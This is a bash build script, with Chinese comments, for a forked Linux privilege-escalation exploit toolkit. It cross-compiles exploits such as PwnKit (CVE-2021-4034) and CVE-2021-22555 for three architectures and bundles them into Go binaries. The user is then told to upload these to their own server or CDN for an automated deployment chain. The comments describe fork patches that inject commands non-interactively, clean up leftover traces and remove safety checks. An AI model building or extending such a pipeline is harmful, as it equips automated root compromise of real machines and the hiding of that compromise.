#!/bin/bash
# lpe-toolkit fork 全量构建: amd64 / arm64 / 386 三架构。
# 产物: build_out/lpe-fork-{amd64,arm64,386}, 上传到自有服务器/CDN 后供部署链使用
# 供自动化部署链优先下载(脱离 GitHub)。
#
# 构建方式: 持久化 builder 容器(工具链安装一次并校验, 避免每次现装
# 依赖受网络抖动影响; 也绕开 docker image 存储的偶发损坏)。
#
# fork 补丁清单(相对上游 main 2ecb09b):
#   1. exploits/cve_2021_4034.c —— 自包含 berdav 改版(内嵌 pwnkit.so,
#      零 gcc 依赖, 双通道触发, PK_CMD 非交互, watcher 清残留);
#   2. exploits/pwnkit_so_src/pwnkit.c —— gconv 模块(标记 + PK_CMD);
#   3. copyfail 替换为 badsectorlabs copyfail-go(实测 C 版失败),
#      并删除 algif 模块 SkipCheck(内建模块时误跳过);
#   4. toolkit.go —— 删 pwnkit 的 gcc SkipCheck; -c 注入 PK_CMD;
#      pkExecuted 防二次执行; GTFOBins 噪声 -q 静默;
#   5. build-exploits.sh —— 缺架构目录时不再因 set -e/pipefail 早退;
#      构建容器内覆盖新版 linux/io_uring.h(v6.14, pintheft 需要)。
#
# 懒同步: 上游出新 CVE 时 git pull 后重跑本脚本即可; 平时零维护。
set -euo pipefail
cd "$(dirname "$0")"
BUILDER="lpe-fork-builder-c"

echo "[*] 重新生成 pwnkit_so.h (centos:7 / glibc 2.17)..."
./exploits/rebuild_pwnkit_so.sh

echo "[*] 准备 builder 容器 (工具链安装+校验, 一次)..."
if ! docker ps --format '{{.Names}}' | grep -qx "$BUILDER"; then
    docker rm -f "$BUILDER" >/dev/null 2>&1 || true
    docker run -d --name "$BUILDER" --platform linux/amd64 \
        -v "$PWD:/work" -w /work golang:1.22-bookworm sleep infinity >/dev/null
    docker exec "$BUILDER" bash -c '
        set -e
        apt-get update -qq >/dev/null 2>&1 || apt-get update -qq >/dev/null 2>&1 || true
        apt-get install -y -qq gcc gcc-aarch64-linux-gnu gcc-i686-linux-gnu >/dev/null 2>&1 \
            || apt-get install -y -qq gcc gcc-aarch64-linux-gnu gcc-i686-linux-gnu >/dev/null 2>&1
        mkdir -p /usr/include/linux /usr/include/x86_64-linux-gnu/linux \
            /usr/aarch64-linux-gnu/include/linux /usr/i686-linux-gnu/include/linux
        cp /work/build-assets/linux/io_uring.h /usr/include/linux/io_uring.h
        cp /usr/include/linux/io_uring.h /usr/include/x86_64-linux-gnu/linux/io_uring.h
        cp /usr/include/linux/io_uring.h /usr/aarch64-linux-gnu/include/linux/io_uring.h
        cp /usr/include/linux/io_uring.h /usr/i686-linux-gnu/include/linux/io_uring.h
        command -v gcc >/dev/null && command -v aarch64-linux-gnu-gcc >/dev/null \
            && command -v i686-linux-gnu-gcc >/dev/null
        test -f /usr/include/x86_64-linux-gnu/bits/wordsize.h
        printf "int main(void){return 0;}\n" > /tmp/smoke.c
        gcc -static -o /tmp/smoke /tmp/smoke.c
        aarch64-linux-gnu-gcc -static -o /tmp/smoke_a64 /tmp/smoke.c
        i686-linux-gnu-gcc -static -o /tmp/smoke_i386 /tmp/smoke.c
        echo "toolchain verified"
    ' || { echo "FATAL: builder 初始化失败"; docker rm -f "$BUILDER" >/dev/null 2>&1 || true; exit 1; }
fi

echo "[*] 交叉编译 exploits + Go 打包..."
docker exec "$BUILDER" bash -c '
    set -e
    cd /work
    rm -rf exploits/bin build_out
    TARGET_ARCH=amd64 ./build-exploits.sh >/tmp/a.log 2>&1 || { echo "amd64 FAIL"; tail -8 /tmp/a.log; exit 1; }
    TARGET_ARCH=arm64 ./build-exploits.sh >/tmp/b.log 2>&1 || { echo "arm64 FAIL"; tail -8 /tmp/b.log; exit 1; }
    TARGET_ARCH=386   ./build-exploits.sh >/tmp/c.log 2>&1 || { echo "386 FAIL"; tail -8 /tmp/c.log; exit 1; }
    # [FORK] copyfail 用 copyfail-go (实测 C 版失败) 覆盖 C 版
    cp exploits/vendor_bin/amd64/copyfail exploits/bin/amd64/copyfail
    # [FORK] cve_2021_22555 是 32 位专属(上游 -m32 设计); gcc-multilib
    # 与交叉编译器在 Debian 上互斥, 32 位版在独立 multilib 容器编译后
    # vendor 于此, 覆盖进 amd64 发货物。
    cp exploits/vendor_bin/amd64/cve_2021_22555 exploits/bin/amd64/cve_2021_22555
    cp exploits/vendor_bin/arm64/copyfail exploits/bin/arm64/copyfail
    cp exploits/vendor_bin/386/copyfail   exploits/bin/386/copyfail
    mkdir -p build_out
    GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o build_out/lpe-fork-amd64 .
    GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o build_out/lpe-fork-arm64 .
    GOOS=linux GOARCH=386   go build -ldflags="-s -w" -o build_out/lpe-fork-386 .
    echo "=== per-arch exploit counts ==="
    for a in amd64 arm64 386; do echo -n "$a: "; ls exploits/bin/$a | wc -l; done
    ls -la build_out/
'

echo "OK: build_out/lpe-fork-{amd64,arm64,386} 就绪。"
echo "上传到你的服务器/CDN: lpe-fork-amd64 / lpe-fork-arm64 / lpe-fork-386"
